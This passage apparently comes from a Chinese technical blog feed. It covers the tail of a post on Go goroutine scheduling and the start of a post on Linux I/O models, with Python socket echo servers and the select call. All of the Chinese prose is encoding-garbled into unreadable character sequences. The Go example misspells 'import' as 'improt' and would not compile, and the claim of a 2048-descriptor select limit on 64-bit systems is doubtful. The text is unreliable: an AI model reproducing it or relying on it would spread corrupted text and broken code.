<p><code>runtime.newproc1</code> æ ¹æ®å…¥å‚åˆå§‹åŒ–ä¸€ä¸ª <code>g</code>ï¼Œè¯¥å‡½æ•°çš„è¡Œä¸ºå¯åˆ†ä¸ºï¼š</p>
<ol>
<li>è·å–æˆ–è€…åˆ›å»ºæ–°çš„ Goroutine ç»“æ„ä½“ï¼šä»å¤„ç†å™¨çš„ <code>gFree</code> åˆ—è¡¨å¾—åˆ°ä¸€ä¸ªç©ºé—²çš„ gã€‚å¦‚æœè·å–å¤±è´¥åˆ™åˆ›å»ºä¸€ä¸ªæ–°çš„ g</li>
<li>å°†ä¼ å…¥çš„å‚æ•°ç§»åˆ° Goroutine çš„æ ˆä¸Šï¼šå°† fn çš„å‚æ•°å…¨éƒ¨å‹æ ˆ</li>
<li>æ›´æ–° Goroutine è°ƒåº¦ç›¸å…³çš„å±æ€§ï¼šè®¾ç½®æ–° g çš„ spã€pcå¹¶æ›´æ–°å…¶çŠ¶æ€åˆ° <code>_Grunnable</code></li>
<li>å°† Goroutine åŠ å…¥è¿è¡Œé˜Ÿåˆ— runqï¼šGo è¯­è¨€ä¸­æœ‰ä¸¤ä¸ªè¿è¡Œé˜Ÿåˆ—ï¼Œä¸€ä¸ªæ˜¯å¤„ç†å™¨æœ¬åœ°çš„è¿è¡Œé˜Ÿåˆ—ï¼Œå¦ä¸€ä¸ªæ˜¯è°ƒåº¦å™¨æŒæœ‰çš„å…¨å±€è¿è¡Œé˜Ÿåˆ—ï¼Œåªæœ‰åœ¨æœ¬åœ°è¿è¡Œé˜Ÿåˆ—æ²¡æœ‰å‰©ä½™ç©ºé—´æ—¶æ‰ä¼šä½¿ç”¨å…¨å±€é˜Ÿåˆ—<br><img src="https://i.loli.net/2020/04/27/1bVMsIOvXk3Dlx7.png" alt="è¿è¡Œé˜Ÿåˆ—"></li>
</ol>
<h2 id="è§¦å‘è°ƒåº¦"><a href="#è§¦å‘è°ƒåº¦" class="headerlink" title="è§¦å‘è°ƒåº¦"></a>è§¦å‘è°ƒåº¦</h2><ul>
<li><p>ä¸»åŠ¨æŒ‚èµ·ï¼šå½“ goroutine é™·å…¥ä¼‘çœ ï¼ˆå¦‚ <code>time.sleep</code>ï¼‰æˆ–é˜»å¡åœ¨ä¸€æ¬¡ chan æ“ä½œæ—¶ï¼Œgoroutine è§¦å‘ä¸»åŠ¨æŒ‚èµ·ã€‚ä¸»åŠ¨æŒ‚èµ·ä¼šå°†å½“å‰ goroutine æš‚åœã€‚è°ƒåº¦å™¨æŠŠ goroutine çŠ¶æ€è®¾ä¸º <code>_Gwaiting</code> å¹¶<strong>è§£é™¤ goroutine ä¸çº¿ç¨‹çš„ç»‘å®š</strong>ï¼ˆç›¸å½“äºè®©å‡ºçº¿ç¨‹ï¼Œéšåå°±å¯ä»¥æ‰§è¡Œä¸€æ¬¡ goroutine è°ƒåº¦ï¼‰ï¼Œç­‰å¾…çŠ¶æ€çš„ goroutine ä¸å ç”¨çº¿ç¨‹ã€‚å½“ä¸»åŠ¨æŒ‚èµ·çš„ goroutine æ»¡è¶³ç‰¹å®šæ¡ä»¶åï¼Œè¿è¡Œæ—¶å°†å…¶çŠ¶æ€è®¾ä¸º <code>_Grunnable</code> å¹¶æ”¾åˆ°è¿è¡Œé˜Ÿåˆ—ç­‰å¾…è°ƒåº¦ã€‚</p>
</li>
<li><p>ç³»ç»Ÿè°ƒç”¨ï¼šå½“ goroutine é˜»å¡åœ¨ä¸€æ¬¡ IO æˆ–å…¶å®ƒç³»ç»Ÿè°ƒç”¨ä¸Šè°ƒåº¦å™¨ä¼šæ›´æ–° goroutine çŠ¶æ€ä¸º <code>_Gsyscall</code> å¹¶<strong>è§£é™¤çº¿ç¨‹å’Œå¤„ç†å™¨çš„ç»‘å®š</strong>ï¼ˆç›¸å½“äºè®©å‡ºå¤„ç†å™¨ï¼Œè¿™æ ·å¤„ç†å™¨å°±å¯ä»¥ç»‘å®šåˆ°å…¶å®ƒçº¿ç¨‹ä¸Šã€‚åŸçº¿ç¨‹é™·å…¥ç³»ç»Ÿè°ƒç”¨ç­‰å¾…è¿”å›ã€‚è¿™ä¸ªè¿‡ç¨‹è§¦å‘ä¸€æ¬¡çº¿ç¨‹åˆ‡æ¢çš„ç³»ç»Ÿè°ƒç”¨ï¼‰ã€‚ç³»ç»Ÿè°ƒç”¨ç»“æŸåï¼Œä¸ºè¿™ä¸ª goroutine é‡æ–°åˆ†é…èµ„æºå¹¶æ›´æ–°å…¶çŠ¶æ€ä¸º <code>_Grunnable</code>ï¼Œæ‰¾åˆ°ä¸€ä¸ªå¯ç”¨çš„å¤„ç†å™¨ä¸è¿™ä¸ª goroutine ç»‘å®šã€‚</p>
</li>
</ul>
<p>ä¸‹é¢è¿™æ®µä»£ç ç¤ºèŒƒäº†è¿è¡Œæ—¶åœ¨ä¸»åŠ¨æŒ‚èµ·å’Œç³»ç»Ÿè°ƒç”¨æ—¶è¿›è¡Œåç¨‹è°ƒåº¦ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line">improt (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;runtime&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    runtime.GOMAXPROCS(<span class="number">1</span>)</span><br><span class="line">    sched := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">    loopCount := <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            <span class="keyword">select</span> &#123;</span><br><span class="line">                <span class="keyword">case</span> &lt;-sched:</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    loopCount += <span class="number">1</span></span><br><span class="line">                    fmt.Printf(<span class="string">&quot;loop %d\n&quot;</span>, loopCount) <span class="comment">// Printf å±äº IOï¼Œå¯èƒ½ä¼šé˜»å¡ç„¶åè§¦å‘è°ƒåº¦</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sched &lt;-<span class="keyword">struct</span>&#123;&#125;&#123;&#125; <span class="comment">// ä¸»åŠ¨é˜»å¡åœ¨ä¸€æ¬¡ channel æ“ä½œä¸Šï¼Œè§¦å‘è°ƒåº¦</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åå¤æ‰§è¡Œè¿™æ®µç¨‹åºä¼šå‘ç°è¾“å‡ºç»“æœä¸å”¯ä¸€ï¼Œå› ä¸º <code>fmt.Printf</code> æ“ä½œå…·ä½“ä»€ä¹ˆæ—¶å€™é˜»å¡æ˜¯è¯´ä¸å‡†çš„ã€‚ä½†åªè¦æœ‰ loop è¢«æ‰“å°å‡ºæ¥ï¼Œå¯ä»¥è‚¯å®šå‘ç”Ÿäº†ä¸¤æ¬¡è°ƒåº¦ï¼šä¸€æ¬¡ç”± chan å‘é€æ“ä½œå¯¼è‡´ï¼Œä¸€æ¬¡ç”± IO æ“ä½œå¯¼è‡´ã€‚</p>
<h2 id="è®¾è®¡åŸç†"><a href="#è®¾è®¡åŸç†" class="headerlink" title="è®¾è®¡åŸç†"></a>è®¾è®¡åŸç†</h2><p>æ€»ç»“èµ·æ¥ä¸‰ä¸ªç‰¹ç‚¹ï¼šå¤šçº¿ç¨‹ã€ä»»åŠ¡çªƒå–ã€æŠ¢å å¼ï¼š</p>
<ol>
<li>å¤šçº¿ç¨‹ï¼šè¿›ç¨‹ä¸­å¯ä»¥åŒæ—¶å­˜åœ¨å¤šä¸ªæ´»è·ƒçº¿ç¨‹ã€‚å¤šçº¿ç¨‹è°ƒåº¦å™¨å¼•å…¥äº† GOMAXPROCS å˜é‡å¸®åŠ©æˆ‘ä»¬çµæ´»æ§åˆ¶ç¨‹åºä¸­çš„æœ€å¤§å¤„ç†å™¨æ•°ï¼Œå³æ´»è·ƒçº¿ç¨‹æ•°</li>
<li>ä»»åŠ¡çªƒå–ï¼šè¿›è¡Œ goroutine è°ƒåº¦æ—¶ï¼Œè°ƒåº¦å™¨ä¼šå…ˆä»å½“å‰å¤„ç†å™¨æˆ–å…¨å±€å¾…è¿è¡Œé˜Ÿåˆ—ä¸­è·å¾—ä¸€ä¸ª goroutineï¼›å¦‚æœè·å–å¤±è´¥ï¼Œåˆ™ä»å…¶å®ƒå¤„ç†å™¨çš„å¾…è¿è¡Œé˜Ÿåˆ—ä¸­éšæœºè·å– goroutine</li>
<li>æŠ¢å å¼ï¼šSTW å’Œæ ˆæ‰«ææ—¶ä¼šè§¦å‘æŠ¢å ã€‚å½“å‰ goroutine è¢«è®¾ä¸º _Gpreemptedï¼Œè°ƒåº¦å™¨è¿›è¡Œä¸€æ¬¡ goroutine è°ƒåº¦</li>
</ol>
]]></content>
      <categories>
        <category>è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘ç»œIO</title>
    <url>/2020/04/17/%E7%BD%91%E7%BB%9CIO/</url>
    <content><![CDATA[<p>è®¡ç®—æœºä¹‹é—´å¯ä»¥é€šä¿¡ï¼Œæœ¬è´¨ä¸Šä¹Ÿæ˜¯è®¡ç®—æœºè¿›ç¨‹ç›¸äº’é€šä¿¡ã€‚ä¸ºäº†æ–¹ä¾¿ä¸åŒç»ˆç«¯è¿›è¡Œé€šä¿¡ï¼Œç½‘ç»œåè®®æ ˆæŠ½è±¡å‡ºsocketå±‚ï¼Œé€šè¿‡å¯¹socketæ–‡ä»¶æè¿°ç¬¦çš„æ“ä½œæ¥è¿›è¡Œç½‘ç»œIOã€‚å½“ç„¶ï¼Œä¸åŒçš„åº”ç”¨åœºæ™¯ï¼Œè¡ç”Ÿå‡ºäº†ä¸åŒçš„ç½‘ç»œæ¨¡å‹</p>
<span id="more"></span>

<h2 id="ä¸€æ¬¡ç½‘ç»œå“åº”"><a href="#ä¸€æ¬¡ç½‘ç»œå“åº”" class="headerlink" title="ä¸€æ¬¡ç½‘ç»œå“åº”"></a>ä¸€æ¬¡ç½‘ç»œå“åº”</h2><p>äº’è”ç½‘åº”ç”¨ä¸­ï¼Œå¤šæ•°æ¶æ„æ˜¯ CS æ¨¡å¼ï¼Œå³ client å‘å‡ºè¯·æ±‚ï¼Œserver æ¥å—è¯·æ±‚ï¼Œå¤„ç†ä¹‹åè¿”å›å“åº”ã€‚è¿™æ ·çš„ä¸€æ¬¡äº¤äº’ï¼Œä¼´éšç€ client å’Œ server çš„ IO æ“ä½œã€‚</p>
<p>ä¸€æ¬¡ç®€å•çš„äº¤äº’ï¼Œå¾€å¾€æ¶‰åŠç½‘ç»œ IO å’Œç£ç›˜æ–‡ä»¶ IOã€‚å¤§è‡´æµç¨‹å¦‚å›¾ï¼š</p>
<p><img src="https://i.loli.net/2020/04/17/jMxUNO7ltuwgRTX.png" alt="ä¸€æ¬¡IO"></p>
<p>å¯¹ Server è€Œè¨€ï¼Œå¤„ç†å“åº”çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>Server çš„è¿›ç¨‹å‘èµ· Read ç³»ç»Ÿè°ƒç”¨ï¼Œå†…æ ¸éšå³ä»ç¡¬ä»¶ Disk è¯»å–æ•°æ®åˆ°å†…æ ¸ç¼“å†²åŒºï¼ˆkernel bufï¼‰</li>
<li>å†…æ ¸æŠŠ kernel buf çš„æ•°æ® copy åˆ°åº”ç”¨ç¨‹åºè¿›ç¨‹çš„ç¼“å†²åŒºï¼Œåº”ç”¨ç¨‹åºå°±å¯ä»¥å¯¹æ•°æ®è¿›è¡Œä¿®æ”¹ã€‚</li>
<li>åº”ç”¨è¿›ç¨‹å°†æ•°æ®é€šè¿‡ç³»ç»Ÿè°ƒç”¨ Send å‘é€åˆ° socket ç¼“å†²åŒºï¼Œæ¯ä¸ª socket æ–‡ä»¶éƒ½åœ¨å†…æ ¸ç»´æŠ¤äº†ä¸€ä¸ªå‘é€/æ¥å—ç¼“å†²åŒºã€‚</li>
<li>æœ€åå†æŠŠ socket å‘é€ç¼“å†²åŒºçš„æ•°æ® copy åˆ° NIC ç½‘å¡ä¸­ï¼Œé€šè¿‡åè®®æ ˆå‘é€åˆ°Client çš„ç½‘å¡ã€‚</li>
</ol>
<p>æ‰€è°“çš„IOï¼Œå°±æ˜¯å°†ç¡¬ä»¶ï¼ˆç£ç›˜ã€ç½‘å¡ï¼‰çš„æ•°æ®è¯»å–åˆ°ç¨‹åºçš„å†…å­˜ä¸­ã€‚</p>
<p>å› ä¸ºåº”ç”¨ç¨‹åºå¾ˆå°‘å¯ä»¥ç›´æ¥å’Œç¡¬ä»¶äº¤äº’ï¼Œå› æ­¤æ“ä½œç³»ç»Ÿä½œä¸ºä¸¤è€…çš„æ¡¥æ¢ã€‚é€šå¸¸æ“ä½œç³»ç»Ÿåœ¨å¯¹æ¥ä¸¤ç«¯ï¼ˆåº”ç”¨ç¨‹åºä¸ç¡¬ä»¶ï¼‰æ—¶ï¼Œè‡ªèº«æœ‰ä¸€ä¸ªå†…æ ¸ bufï¼Œç”¨äºæ•°æ®çš„ copy ä¸­è½¬ã€‚</p>
<p><img src="https://i.loli.net/2020/04/17/lJoTNEzbcdejuFt.png" alt="ç¡¬ä»¶ã€å†…æ ¸ã€åº”ç”¨"></p>
<p>ä¸€èˆ¬ç½‘ç»œ IO åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li>ç­‰å¾…æ•°æ®é˜¶æ®µã€‚æ•°æ®é€šè¿‡åè®®æ ˆå‘é€åˆ°ç½‘å¡ï¼Œç½‘å¡å†é€šè¿‡ DMA copy åˆ° kernel buf</li>
<li>æ‹·è´æ•°æ®é˜¶æ®µã€‚å°† kernel buf çš„æ•°æ® copy åˆ° app buf ä¸­ã€‚</li>
</ol>
<h2 id="Linux-5-ç§-IO-æ¨¡å‹"><a href="#Linux-5-ç§-IO-æ¨¡å‹" class="headerlink" title="Linux 5 ç§ IO æ¨¡å‹"></a>Linux 5 ç§ IO æ¨¡å‹</h2><h3 id="é˜»å¡-IO"><a href="#é˜»å¡-IO" class="headerlink" title="é˜»å¡ IO"></a>é˜»å¡ IO</h3><p>æ‰€è°“é˜»å¡ IO æŒ‡åœ¨ç½‘ç»œ IO çš„ä¸¤ä¸ªé˜¶æ®µè¿›ç¨‹éƒ½ä¼šé˜»å¡ã€‚</p>
<p><img src="https://i.loli.net/2020/04/17/WoMVpI9X72KzcGN.png" alt="é˜»å¡IO"></p>
<p>è¿›ç¨‹å¯¹è±¡å‘èµ· Recv æ“ä½œï¼Œè¿™æ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œç„¶åå†…æ ¸ä¼šçœ‹ kernel buf æ˜¯å¦æœ‰æ•°æ®ï¼Œå¦‚æœæ²¡æœ‰æ•°æ®ï¼Œé‚£ä¹ˆè¿›ç¨‹å°†ä¼šè¢«æŒ‚èµ·ï¼Œç›´åˆ° kernek buf ä»ç¡¬ä»¶æˆ–è€…ç½‘ç»œè¯»å–åˆ°æ•°æ®ä¹‹åï¼Œå†…æ ¸å†æŠŠæ•°æ®ä» kernel buf copy åˆ° app bufä¸­ï¼Œç„¶åå”¤é†’å‘èµ·è°ƒç”¨çš„è¿›ç¨‹ï¼Œå¹¶ä¸” Recv æ“ä½œå°†ä¼šè¿”å›æ•°æ®ã€‚æ¥ä¸‹æ¥è¿›è¡Œå¯ä»¥å¯¹è¿›ç¨‹ buf çš„æ•°æ®è¿›è¡Œå¤„ç†ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">address = (<span class="string">&#x27;&#x27;</span>, <span class="number">5000</span>)</span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">sock.bind(address)</span><br><span class="line">sock.listen(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    conn, addr = sock.accept() <span class="comment"># è¿›ç¨‹ä¼šé˜»å¡ç›´è‡³æœ‰æ•°æ®è¿”å›</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;client &#123;&#125; connect&#x27;</span>.<span class="built_in">format</span>(conn.fileno()))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = conn.recv(<span class="number">1024</span>) <span class="comment"># è¿›ç¨‹ä¼šé˜»å¡ç›´è‡³æœ‰æ•°æ®è¿”å›</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;client &#123;&#125; closed&#x27;</span>.<span class="built_in">format</span>(conn.fileno()))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;data is &#x27;</span>, data)</span><br><span class="line">            conn.sendall(data)</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure>

<h3 id="éé˜»å¡-IO"><a href="#éé˜»å¡-IO" class="headerlink" title="éé˜»å¡ IO"></a>éé˜»å¡ IO</h3><p>å½“è¿›ç¨‹æŠŠä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦è®¾ç½®æˆéé˜»å¡æ—¶ï¼Œæ‰§è¡Œ read å’Œ write ç­‰ I/O æ“ä½œå°±ä¼šç«‹åˆ»è¿”å›ã€‚åœ¨ C è¯­è¨€ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ‰€ç¤ºçš„ä»£ç ç‰‡æ®µå°†ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦è®¾ç½®æˆéé˜»å¡çš„ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> flags = fcntl(fd, F_GETFL, <span class="number">0</span>);</span><br><span class="line">fcntl(fd, F_SETFL, flags | O_NONBLOCK);</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ²¡æœ‰æ•°æ®ï¼Œå‘èµ·çš„ IO ç³»ç»Ÿè°ƒç”¨ä¼šé©¬ä¸Šè¿”å›ä¸€ä¸ª <code>EWOULDBLOCK</code> é”™è¯¯ã€‚å‡½æ•°è¿”å›ä¹‹åï¼Œè¿›ç¨‹æ²¡æœ‰è¢«æŒ‚èµ·ï¼Œå¯ä»¥ç»§ç»­åšåˆ«çš„ã€‚</p>
<p><img src="https://i.loli.net/2020/04/17/6yAJMt5CG4dRj2Z.png" alt="éé˜»å¡IO"></p>
<p>è¿›ç¨‹è·å¾—äº† EWOULDBLOCK ä¹‹åä¼šå†æ¬¡å‘èµ·éé˜»å¡ IO è¯·æ±‚ï¼Œè¿™ä¸ªè¿‡ç¨‹è¿˜æ˜¯ä¼šä½¿ç”¨ CPUï¼Œå› æ­¤ä¹Ÿç§°ä¹‹ä¸ºè½®è¯¢ï¼ˆpollingï¼‰ã€‚ç„¶è€Œæ­¤æ—¶åº”ç”¨ç¨‹åºå¯ä»¥å¯¹è¯»å–æ“ä½œç³»ç»Ÿç¼“å†²åŒºä¸­çš„æ•°æ®å¹¶è¿›è¡Œæ“ä½œã€‚æ¢è¨€ä¹‹è¿›ç¨‹ä½¿ç”¨éé˜»å¡ I/O æ—¶å¯ä»¥åœ¨ç­‰å¾…è¿‡ç¨‹ä¸­æ‰§è¡Œå…¶ä»–çš„ä»»åŠ¡ã€‚</p>
<p>å†…æ ¸æœ‰æ•°æ®çš„æ—¶å€™ï¼Œå†…æ ¸å°† kernel buf çš„æ•°æ® copy åˆ° app buf çš„è¿‡ç¨‹è¿˜æ˜¯éœ€è¦ cpu å‚ä¸ï¼Œå¯¹äºéé˜»å¡ IO æ¥è¯´ï¼Œè¿™ä¸ªè¿‡ç¨‹ä»ç„¶æ˜¯é˜»å¡çš„ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> errno</span><br><span class="line"></span><br><span class="line">address = (<span class="string">&#x27;&#x27;</span>, <span class="number">5000</span>)</span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">sock.setblocking(<span class="literal">False</span>) <span class="comment"># å°† socket è®¾ç½®ä¸ºéé˜»å¡çš„</span></span><br><span class="line">sock.bind(address)</span><br><span class="line">sock.listen(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>: <span class="comment"># è·å¾— EWOULDBLOCK é”™è¯¯ï¼Œè½®è¯¢</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn, addr = sock.accept()</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">if</span> e.args[<span class="number">0</span>] <span class="keyword">in</span> (errno.EWOULDBLOCK, errno.EAGAIN):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;client &#123;&#125; connect&#x27;</span>.<span class="built_in">format</span>(conn.fileno()))</span><br><span class="line">    conn.setblocking(<span class="literal">False</span>) <span class="comment"># å°† socket è®¾ç½®ä¸ºéé˜»å¡çš„</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: <span class="comment"># è½®è¯¢</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> e.args[<span class="number">0</span>] <span class="keyword">in</span> (errno.EWOULDBLOCK, errno.EAGAIN):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;client &#123;&#125; closed&#x27;</span>.<span class="built_in">format</span>(conn.fileno()))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;data is &#x27;</span>, data)</span><br><span class="line">            conn.sendall(data)</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure>

<h3 id="å¤šè·¯å¤ç”¨-IO"><a href="#å¤šè·¯å¤ç”¨-IO" class="headerlink" title="å¤šè·¯å¤ç”¨ IO"></a>å¤šè·¯å¤ç”¨ IO</h3><p>é˜»å¡ IO ä¼šè®©çº¿ç¨‹æŒ‚èµ·ã€‚éé˜»å¡ IO éœ€è¦ä¸€ç›´åš pollingï¼Œæ¯ä¸€æ¬¡ polling éƒ½ä¼šåšç³»ç»Ÿè°ƒç”¨ï¼ŒæŸç§ç¨‹åº¦ä¸‹ï¼Œéé˜»å¡ IO çš„æ€§èƒ½å°†è¿˜ä¸å¦‚é˜»å¡ IOã€‚æ—¢ç„¶éœ€è¦å†…æ ¸é¢‘ç¹æ“ä½œï¼Œé‚£ä¹ˆå°±æœ‰äººæƒ³å‡ºäº†æ–°çš„æ¨¡å‹ï¼šè®©å†…æ ¸ä»£ç†å»åšè½®è¯¢ï¼Œç„¶ååº”ç”¨è¿›ç¨‹åªæœ‰æ•°æ®å‡†å¤‡äº†å†å‘èµ· IO æ“ä½œä¸å°±å¥½äº†å—ï¼Ÿ</p>
<p>å¤šè·¯å¤ç”¨ IO å°±æ˜¯è¿™æ ·çš„åŸç†ï¼Œæ‰€è°“â€œå¤šè·¯å¤ç”¨â€æ˜¯æŒ‡ä¸€ä¸ªçº¿ç¨‹å¤ç”¨å¤šä¸ª socketã€‚ç”±å†…æ ¸è´Ÿè´£ç›‘æ§åº”ç”¨æŒ‡å®šçš„ socket æ–‡ä»¶æè¿°ç¬¦ï¼Œsocket å‡†å¤‡å¥½ï¼ˆå¯è¯»ï¼Œå¯å†™ï¼Œå¼‚å¸¸ç­‰ï¼‰æ—¶ï¼Œé€šçŸ¥åº”ç”¨è¿›ç¨‹ã€‚â€œå‡†å¤‡å¥½â€æ˜¯ä¸€ä¸ªäº‹ä»¶ï¼Œå½“äº‹ä»¶å‘ç”Ÿï¼Œé€šçŸ¥åº”ç”¨è¿›ç¨‹ï¼Œè€Œåº”ç”¨è¿›ç¨‹å¯ä»¥æ‰§è¡Œäº‹å…ˆæ³¨å†Œçš„å¯¹åº”è¯¥äº‹ä»¶çš„å›è°ƒå‡½æ•°ã€‚æœ‰å¤§é‡äº‹ä»¶å‘ç”Ÿçš„å‰æä¸‹ï¼Œå¤šç”¨å¤ç”¨ IO å¯ä»¥æå¤§æé«˜æœåŠ¡å™¨å¹¶å‘æ€§èƒ½ã€‚</p>
<blockquote>
<p>å¤šè·¯å¤ç”¨ IO = å¤šè·¯ç›‘å¬ + é˜»å¡/éé˜»å¡ IOã€‚å¤šè·¯ç›‘å¬æŒ‡çš„æ˜¯ä¸‹æ–‡çš„ select/poll/epoll ç­‰ç›‘å¬ç³»ç»Ÿï¼Œè¿™äº›ç³»ç»Ÿç›‘å¬çš„ socket åˆ™è´Ÿè´£ IOã€‚</p>
</blockquote>
<h4 id="select"><a href="#select" class="headerlink" title="select"></a>select</h4><p>select ç³»ç»Ÿè°ƒç”¨æä¾›ä¸€ä¸ªæœºåˆ¶æ¥å®ç°åŒæ­¥ IOï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">select</span><span class="params">(<span class="keyword">int</span> n, fd_set* readfds, fd_set* writefds, fd_set* exceptfds, struct timeval* timeout)</span></span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/30/fMzL5wP7vETWpC6.png" alt="selectæ¨¡å‹g"></p>
<p>è°ƒç”¨ select å°†å¯¼è‡´é˜»å¡ç›´åˆ°æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦å‡†å¤‡å¥½æ‰§è¡Œ IOï¼Œæˆ–è€…å¯é€‰å‚æ•° timeout æŒ‡å®šçš„æ—¶é—´å·²ç»è¿‡å»ã€‚</p>
<p>select æˆåŠŸè¿”å›æ—¶ï¼Œè¿”å›å€¼æ˜¯ ready çŠ¶æ€çš„ fd æ•°ç›®ã€‚æ¯ç»„ set éƒ½è¢«ä¿®æ”¹ä»¥ä½¿å®ƒåªåŒ…å«å‡†å¤‡å¥½ IO çš„æ–‡ä»¶æè¿°ç¬¦ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå‡è®¾æœ‰ä¸¤ä¸ª fd åˆ†åˆ«æ˜¯ 7 å’Œ 9 è¢«æ”¾åœ¨ readfdsã€‚select è¿”å›åï¼Œåº”ç”¨è¿›ç¨‹éœ€è¦éå† readfdsï¼Œåˆ¤æ–­å…¶ä¸­æ¯ä¸€ä¸ª fd çš„çŠ¶æ€ï¼Œå¦‚æœ 7 å‘ç”Ÿè¯»äº‹ä»¶è€Œ 9 æ²¡æœ‰ï¼Œé‚£ä¹ˆå¯¹ 7 è¯»ä¸ä¼šé˜»å¡ï¼Œå¯¹ 9 è¯»å¯èƒ½é˜»å¡ï¼ˆâ€å¯èƒ½â€æ˜¯å› ä¸ºæ•°æ®æˆ–è®¸æ­£å¥½åœ¨ select è¿”å›åå°±å¯ç”¨ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œä¸‹ä¸€æ¬¡è°ƒç”¨ select å°†è¿”å› 9ï¼‰ã€‚</p>
<p><strong>å› ä¸º fd_set æ˜¯é™æ€åˆ›å»ºçš„ï¼Œå®ƒä»¬å¯¹ fd çš„æœ€å¤§æ•°ç›®å¼ºåŠ äº†ä¸€ä¸ªé™åˆ¶ï¼Œèƒ½å¤Ÿæ”¾è¿› set ä¸­çš„ fd çš„æ•°é‡ç”±åœ¨ 32 ä½æœºé»˜è®¤æ˜¯ 1024ï¼Œ64ä½æœºé»˜è®¤æ˜¯2048ã€‚</strong></p>
<p>ç¼ºç‚¹ï¼š</p>
<ol>
<li>å•è¿›ç¨‹å¯ä»¥æ‰“å¼€ fd æœ‰é™åˆ¶ï¼›</li>
<li>å¯¹å¾—åˆ°çš„ fd_set è¿›è¡Œçº¿æ€§æ‰«æï¼Œå³é‡‡ç”¨è½®è¯¢çš„æ–¹æ³•ï¼Œæ•ˆç‡è¾ƒä½ï¼›</li>
